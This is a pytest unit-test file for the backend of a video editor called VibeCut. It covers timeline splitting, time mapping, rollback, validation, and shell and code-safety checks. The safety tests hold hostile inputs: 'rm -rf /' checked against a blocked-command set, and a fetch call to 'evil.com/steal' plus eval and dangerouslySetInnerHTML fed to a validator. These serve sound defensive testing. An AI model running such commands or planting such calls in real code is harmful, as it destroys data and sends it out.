"""Core unit tests for VibeCut backend — timeline ops, time mapping, validator, shell safety."""

import json
import asyncio
from copy import deepcopy
from unittest.mock import MagicMock

import pytest

# ─── Fixtures ───────────────────────────────────────────────────────────────────

from app.models.timeline import TimelineProject, Track, Clip, MediaAsset, ProjectMeta


def _make_timeline(clips=None, media=None) -> TimelineProject:
    """Create a minimal test timeline."""
    media_pool = media or [
        MediaAsset(id="vid1", path="/test/video.mp4", type="video", duration_sec=60.0),
    ]
    tracks = [
        Track(id="track-v1", name="Video", type="video", clips=clips or [
            Clip(
                id="clip_a",
                type="video",
                media_id="vid1",
                source_in_sec=0,
                source_out_sec=30,
                timeline_start_sec=0,
                timeline_end_sec=30,
                speed=1.0,
            ),
        ]),
    ]
    return TimelineProject(
        version="1.0.0",
        project=ProjectMeta(name="Test", width=1920, height=1080, fps=30),
        media_pool=media_pool,
        tracks=tracks,
    )


def _make_state(timeline=None):
    """Create a mock AgentState."""
    from app.agent.state import AgentState
    state = AgentState(project_id="test_proj")
    state.current_timeline = timeline or _make_timeline()
    return state


# ─── Test: split_timeline ────────────────────────────────────────────────────────

class TestSplitTimeline:
    def test_split_at_midpoint(self):
        """Splitting a 30s clip at 15s should produce two 15s clips."""
        from app.tools.timeline_ops import _split_at_time

        timeline = _make_timeline()
        results = _split_at_time(timeline, 15.0)

        assert len(results) == 1
        split = results[0]
        assert split["original_clip_id"] == "clip_a"

        clip_before = split["clip_before"]
        clip_after = split["clip_after"]

        assert clip_before["timeline_start_sec"] == 0
        assert abs(clip_before["timeline_end_sec"] - 15.0) < 0.001
        assert clip_after["timeline_start_sec"] == 15.0
        assert abs(clip_after["timeline_end_sec"] - 30.0) < 0.001

    def test_split_outside_clip_returns_empty(self):
        """Splitting at a time with no clip should return empty."""
        from app.tools.timeline_ops import _split_at_time

        timeline = _make_timeline()
        results = _split_at_time(timeline, 50.0)
        assert results == []

    def test_split_preserves_source_mapping(self):
        """After split, source_out of first = source_in of second."""
        from app.tools.timeline_ops import _split_at_time

        timeline = _make_timeline()
        results = _split_at_time(timeline, 10.0)

        clip_before = results[0]["clip_before"]
        clip_after = results[0]["clip_after"]

        assert abs(clip_before["source_out_sec"] - clip_after["source_in_sec"]) < 0.001


# ─── Test: time mapping ──────────────────────────────────────────────────────────

class TestTimeMapping:
    def test_point_timeline_to_source(self):
        """A point in timeline should map correctly to source time."""
        from app.tools.time_mapping import map_point_timeline_to_source

        timeline = _make_timeline()
        results = map_point_timeline_to_source(timeline, 10.0)

        assert len(results) == 1
        assert results[0]["source_time_sec"] == 10.0
        assert results[0]["clip_id"] == "clip_a"

    def test_point_with_speed(self):
        """With speed=2, timeline 5s = source 10s."""
        clip = Clip(
            id="clip_fast", type="video", media_id="vid1",
            source_in_sec=0, source_out_sec=60,
            timeline_start_sec=0, timeline_end_sec=30, speed=2.0,
        )
        timeline = _make_timeline(clips=[clip])
        from app.tools.time_mapping import map_point_timeline_to_source

        results = map_point_timeline_to_source(timeline, 5.0)
        assert abs(results[0]["source_time_sec"] - 10.0) < 0.001

    def test_source_to_timeline_reverse(self):
        """source_to_timeline should be the inverse of timeline_to_source."""
        from app.tools.time_mapping import map_point_source_to_timeline

        timeline = _make_timeline()
        results = map_point_source_to_timeline(timeline, "vid1", 20.0)

        assert len(results) == 1
        assert abs(results[0]["timeline_time_sec"] - 20.0) < 0.001


# ─── Test: batch execute rollback ────────────────────────────────────────────────

class TestBatchRollback:
    def test_rollback_on_error(self):
        """If one operation in a batch fails, all should be rolled back."""
        from app.tools.timeline_ops import _batch_execute, _exec_add

        state = _make_state()
        original_clip_count = len(state.current_timeline.tracks[0].clips)

        items = [
            # First add should succeed
            {
                "track_id": "track-v1", "media_id": "vid1",
                "source_in_sec": 30, "source_out_sec": 40,
                "timeline_start_sec": 30,
            },
            # Second add should fail (nonexistent track)
            {
                "track_id": "nonexistent_track", "media_id": "vid1",
                "source_in_sec": 40, "source_out_sec": 50,
                "timeline_start_sec": 40,
            },
        ]

        result = _batch_execute(state, items, _exec_add)
        assert "error" in result
        # Should be rolled back to original state
        assert len(state.current_timeline.tracks[0].clips) == original_clip_count


# ─── Test: timeline validator (overlap detection) ────────────────────────────────

class TestValidator:
    def test_detects_overlapping_clips(self):
        """Validator should catch overlapping clips on the same track."""
        from app.services.timeline_validator import validate_timeline

        clips = [
            Clip(id="c1", type="video", media_id="vid1",
                 source_in_sec=0, source_out_sec=20,
                 timeline_start_sec=0, timeline_end_sec=20),
            Clip(id="c2", type="video", media_id="vid1",
                 source_in_sec=10, source_out_sec=30,
                 timeline_start_sec=15, timeline_end_sec=35),  # overlaps c1
        ]
        timeline = _make_timeline(clips=clips)
        errors = validate_timeline(timeline)

        overlap_errors = [e for e in errors if "overlaps" in e]
        assert len(overlap_errors) >= 1

    def test_valid_timeline_no_errors(self):
        """A properly constructed timeline should have no errors."""
        from app.services.timeline_validator import validate_timeline

        timeline = _make_timeline()
        errors = validate_timeline(timeline)
        assert errors == []


# ─── Test: shell command extraction ──────────────────────────────────────────────

class TestShellSafety:
    def test_extract_commands_simple(self):
        """Should extract base command names from piped commands."""
        from app.tools.shell import _extract_commands

        cmds = _extract_commands("ffprobe -v quiet file.mp4 | grep duration")
        assert cmds == ["ffprobe", "grep"]

    def test_extract_commands_chained(self):
        """Should handle && and ; chaining."""
        from app.tools.shell import _extract_commands

        cmds = _extract_commands("echo hello && ls -la ; cat file.txt")
        assert cmds == ["echo", "ls", "cat"]

    def test_blocked_command_detected(self):
        """Blocked commands should be in BLOCKED_COMMANDS set."""
        from app.tools.shell import BLOCKED_COMMANDS, _extract_commands

        cmds = _extract_commands("rm -rf /")
        assert any(cmd in BLOCKED_COMMANDS for cmd in cmds)

    def test_path_prefix_stripped(self):
        """Commands with path prefix should be stripped to base name."""
        from app.tools.shell import _extract_commands

        cmds = _extract_commands("/usr/bin/ffprobe -show_format file.mp4")
        assert cmds == ["ffprobe"]


# ─── Test: history trimming ──────────────────────────────────────────────────────

class TestHistoryTrimming:
    def test_trim_removes_middle_messages(self):
        """When over budget, should remove middle messages, keep first and last."""
        from app.agent.state import AgentState

        state = AgentState(project_id="test")
        # Add a bunch of large messages
        for i in range(100):
            state.conversation_history.append({
                "role": "user" if i % 2 == 0 else "assistant",
                "content": "x" * 5000,  # 5KB each = 500KB total >> 120KB limit
            })

        state.trim_history()

        # Should have been trimmed
        assert len(state.conversation_history) < 100
        # First message preserved
        assert state.conversation_history[0]["role"] == "user"


# ─── Test: creative pack code validation ─────────────────────────────────────────

class TestCreativePackSecurity:
    def test_blocks_fetch(self):
        """Should reject code containing fetch()."""
        from app.tools.creative_packs import _validate_tsx_code

        code = 'const data = await fetch("https://evil.com/steal");'
        error = _validate_tsx_code(code, "EvilComponent")
        assert error is not None
        assert "blocked pattern" in error

    def test_blocks_eval(self):
        """Should reject code containing eval()."""
        from app.tools.creative_packs import _validate_tsx_code

        code = 'eval("alert(1)");'
        error = _validate_tsx_code(code, "EvilComponent")
        assert error is not None

    def test_allows_safe_code(self):
        """Should allow normal Remotion component code."""
        from app.tools.creative_packs import _validate_tsx_code

        code = '''
import React from "react";
import { spring, useVideoConfig } from "remotion";

export const MyCard: React.FC = ({ clip, frame }) => {
  const { fps } = useVideoConfig();
  const opacity = spring({ frame, fps, config: { damping: 15 } });
  return <div style={{ opacity }}>Hello</div>;
};
'''
        error = _validate_tsx_code(code, "MyCard")
        assert error is None

    def test_blocks_dangerously_set_inner_html(self):
        """Should reject dangerouslySetInnerHTML."""
        from app.tools.creative_packs import _validate_tsx_code

        code = '<div dangerouslySetInnerHTML={{ __html: userInput }} />'
        error = _validate_tsx_code(code, "XSSComponent")
        assert error is not None
